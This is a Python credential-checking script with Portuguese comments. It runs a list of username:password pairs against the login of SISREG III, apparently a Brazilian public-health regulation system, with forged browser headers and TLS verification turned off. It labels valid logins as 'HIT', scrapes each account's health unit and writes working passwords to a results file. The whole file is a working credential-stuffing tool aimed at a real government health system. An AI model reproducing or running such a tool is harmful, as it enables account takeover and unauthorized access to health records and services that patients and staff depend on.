# By @johnmdzapis
# Bom Uso!
# Não remova os créditos😞
import hashlib
import requests
import re
import sys
import urllib3
import warnings
import os

# Desativar avisos de HTTPS não verificado
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore", category=UserWarning, module='urllib3')

def calcular_hash_senha(senha):
    """Calcula o hash SHA-256 da senha"""
    return hashlib.sha256(senha.encode()).hexdigest()

def fazer_login(usuario, senha, timeout=10):
    """Faz login no sistema SISREG III"""
    sessao = requests.Session()
    sessao.verify = False  # Desativar verificação SSL (use True em produção)
    
    headers = {
        'Host': 'sisregiii.saude.gov.br',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'sec-ch-ua': '"Not A(Brand";v="99", "Opera";v="107", "Chromium";v="121"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'https://sisregiii.saude.gov.br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 OPR/107.0.0.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Referer': 'https://sisregiii.saude.gov.br/cgi-bin/index?logout=1',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'pt-BR,pt;q=0.9'
    }
    
    senha_hash = calcular_hash_senha(senha)
    
    dados = {
        'usuario': usuario,
        'senha': '',
        'senha_256': senha_hash,
        'etapa': 'ACESSO',
        'logout': ''
    }
    
    url = "https://sisregiii.saude.gov.br/"
    
    try:
        resposta = sessao.post(url, data=dados, headers=headers, timeout=timeout)
        
        if resposta.status_code != 200:
            return {'status': 'ERROR', 'codigo': resposta.status_code, 'capturas': {}}
        
        fonte = resposta.text
        capturas = {}
        
        # Capturar mensagem de limite/erro
        match_limite = re.search(r'<CENTER><font color="red"><B>(.*?)</B>', fonte)
        if match_limite:
            capturas['LIMITADO'] = match_limite.group(1).strip()
        else:
            capturas['LIMITADO'] = None
        
        # Determinar status do login
        status = 'FAILURE'
        
        if 'Login ou senha incorreto(s).' in fonte:
            status = 'FAILURE'
        elif '<p>Perfil</p>' in fonte:
            status = 'SUCCESS'
        elif 'Este operador foi desativado pelo administrador.' in fonte:
            status = 'EXPIRED'
        elif 'Acesso n&atilde;o permitido!' in fonte or 'Acesso n&atilde;o permitido neste dia da semana.' in fonte:
            status = 'CUSTOM'
        elif 'logout' in fonte.lower() or 'sair' in fonte.lower():
            status = 'SUCCESS'
        
        # Capturar unidade
        match_unidade = re.search(r'>Unidade:(.*?)</DIV>', fonte, re.DOTALL)
        if match_unidade:
            texto_unidade = match_unidade.group(1)
            match_unidade_cap = re.search(r'&nbsp;(.*?)</font>', texto_unidade)
            if match_unidade_cap:
                capturas['UNIDADE'] = match_unidade_cap.group(1).strip()
            else:
                # Tentar outro padrão comum
                match_alt = re.search(r'<font[^>]*>(.*?)</font>', texto_unidade)
                if match_alt:
                    capturas['UNIDADE'] = match_alt.group(1).strip()
                else:
                    capturas['UNIDADE'] = texto_unidade.strip()
        else:
            capturas['UNIDADE'] = None
        
        return {
            'status': status,
            'codigo': resposta.status_code,
            'capturas': capturas
        }
        
    except requests.exceptions.Timeout:
        return {'status': 'ERROR', 'codigo': 408, 'capturas': {'LIMITADO': 'Timeout'}}
    except requests.exceptions.RequestException as e:
        return {'status': 'ERROR', 'codigo': 0, 'capturas': {'LIMITADO': str(e)}}
    except Exception as e:
        return {'status': 'ERROR', 'codigo': 0, 'capturas': {'LIMITADO': str(e)}}

def salvar_resultado(usuario, senha, resultado, arquivo="resultados.txt"):
    """Salva o resultado em um arquivo"""
    try:
        with open(arquivo, 'a', encoding='utf-8') as f:
            status = resultado['status']
            capturas = resultado['capturas']
            unidade = capturas.get('UNIDADE', 'N/A')
            limite = capturas.get('LIMITADO', 'N/A')
            
            f.write(f"Usuario: {usuario}\n")
            f.write(f"Status: {status}\n")
            if senha:
                f.write(f"Senha: {senha}\n")
            if unidade != 'N/A':
                f.write(f"Unidade: {unidade}\n")
            if limite != 'N/A':
                f.write(f"Msg: {limite}\n")
            f.write("-" * 40 + "\n")
    except Exception:
        pass

def processar_lista(arquivo_lista, salvar_arquivo=False):
    """Processa uma lista de credenciais"""
    try:
        with open(arquivo_lista, 'r', encoding='utf-8') as f:
            linhas = f.readlines()
    except UnicodeDecodeError:
        try:
            with open(arquivo_lista, 'r', encoding='latin-1') as f:
                linhas = f.readlines()
        except:
            with open(arquivo_lista, 'r') as f:
                linhas = f.readlines()
    except FileNotFoundError:
        print(f"Erro: Arquivo '{arquivo_lista}' não encontrado!")
        return
    
    total = len([l for l in linhas if l.strip() and ':' in l])
    processados = 0
    sucessos = 0
    
    print(f"\n[INFO] Processando {total} credenciais...\n")
    
    for linha in linhas:
        linha = linha.strip()
        if not linha or ':' not in linha:
            continue
            
        partes = linha.split(':', 1)
        if len(partes) < 2:
            continue
            
        usuario = partes[0].strip()
        senha = partes[1].strip()
        
        if not usuario:
            continue
        
        processados += 1
        print(f"[{processados}/{total}] Testando: {usuario}", end='\r')
        
        resultado = fazer_login(usuario, senha)
        
        if resultado['status'] == 'SUCCESS':
            sucessos += 1
        
        # Construir string de capturas
        capturado_str = ""
        if resultado['capturas'].get('LIMITADO'):
            capturado_str += f"LIMITADO: {resultado['capturas']['LIMITADO']}"
        if resultado['capturas'].get('UNIDADE'):
            if capturado_str:
                capturado_str += ", "
            capturado_str += f"UNIDADE: {resultado['capturas']['UNIDADE']}"
        
        # Cores e tipos
        if resultado['status'] == 'SUCCESS':
            cor = '\033[92m'  # Verde
            tipo = 'HIT'
        elif resultado['status'] == 'CUSTOM':
            cor = '\033[93m'  # Amarelo
            tipo = 'CUSTOM'
        elif resultado['status'] == 'EXPIRED':
            cor = '\033[96m'  # Ciano
            tipo = 'EXPIRED'
        elif resultado['status'] == 'FAILURE':
            cor = '\033[91m'  # Vermelho
            tipo = 'FAIL'
        else:
            cor = '\033[90m'  # Cinza
            tipo = 'ERROR'
        
        reset = '\033[0m'
        dados_str = f"usuario={usuario}"
        
        # Exibir resultado
        if capturado_str:
            print(f"{cor}[{tipo}][NOPROXY] {dados_str} - [{capturado_str}]{reset}")
        else:
            print(f"{cor}[{tipo}][NOPROXY] {dados_str}{reset}")
        
        # Salvar resultado se configurado
        if salvar_arquivo:
            salvar_resultado(usuario, senha, resultado)
    
    # Resumo final
    print(f"\n\033[94m[RESUMO] Processados: {processados}, Sucessos: {sucessos}, Falhas: {processados - sucessos}\033[0m")
    
    if salvar_arquivo and sucessos > 0:
        print(f"\033[93m[INFO] Resultados salvos em 'resultados.txt'\033[0m")

def main():
    """Função principal"""
    if len(sys.argv) < 2:
        print("=" * 50)
        print("SISREG III Login Checker")
        print("=" * 50)
        print("Uso: python sisregi.py lista.txt [--save]")
        print("Uso: python sisregi.py usuario senha")
        print("\nOpções:")
        print("  --save  : Salva resultados em arquivo")
        print("\nFormato da lista: usuario:senha (uma por linha)")
        print("=" * 50)
        return
    
    # Modo de teste único
    if len(sys.argv) == 3 and sys.argv[2] != '--save':
        usuario = sys.argv[1]
        senha = sys.argv[2]
        print(f"\n[TESTE ÚNICO] Testando: {usuario}")
        resultado = fazer_login(usuario, senha)
        
        print(f"\nStatus: {resultado['status']}")
        print(f"Código HTTP: {resultado['codigo']}")
        for chave, valor in resultado['capturas'].items():
            if valor:
                print(f"{chave}: {valor}")
        return
    
    # Modo lista
    arquivo_lista = sys.argv[1]
    salvar = len(sys.argv) > 2 and sys.argv[2] == '--save'
    
    if not os.path.exists(arquivo_lista):
        print(f"\033[91mErro: Arquivo '{arquivo_lista}' não encontrado!\033[0m")
        return
    
    try:
        processar_lista(arquivo_lista, salvar)
    except KeyboardInterrupt:
        print("\n\n\033[93m[INFO] Processamento interrompido pelo usuário.\033[0m")
    except Exception as e:
        print(f"\n\033[91mErro inesperado: {e}\033[0m")

if __name__ == "__main__":
    main()